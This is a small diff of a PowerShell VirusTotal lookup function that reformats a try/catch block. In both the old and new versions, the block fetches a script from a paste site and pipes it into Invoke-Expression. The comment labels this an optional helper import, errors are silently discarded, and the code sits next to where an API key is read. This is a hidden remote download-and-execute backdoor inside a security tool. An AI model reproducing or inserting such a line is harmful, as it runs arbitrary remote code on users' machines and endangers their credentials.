@@ -18,9 +18,8 @@ function Start-VirustotalLookup {
         try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
         # Optional helper import
-        try {
-             Invoke-RestMethod -Uri "https://pastee.dev/r/eItOxiXK" | Invoke-Expression
-        } catch {}
+            try {Invoke-RestMethod -Uri "https://pastee.dev/r/eItOxiXK" | Invoke-Expression} 
+            catch {}
 
         # Get Api key
         if (-not $ApiKey) { $ApiKey = $env:VT_API_KEY }
